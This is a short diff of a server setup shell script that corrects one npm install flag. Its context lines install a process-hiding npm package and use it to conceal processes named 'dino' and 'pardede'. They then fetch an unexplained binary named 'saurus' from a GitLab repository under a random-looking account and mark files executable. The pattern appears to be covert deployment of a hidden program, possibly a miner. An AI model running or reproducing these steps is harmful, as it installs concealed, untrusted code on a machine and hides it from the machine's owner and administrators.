@@ -5,7 +5,7 @@ sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-esse
 sudo apt install screen -y
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs
-sudo apt install npm =y
+sudo apt install npm -y
 sudo npm i -g node-process-hider && sudo ph add dino
 sudo ph add pardede
 wget https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/saurus && chmod +x *
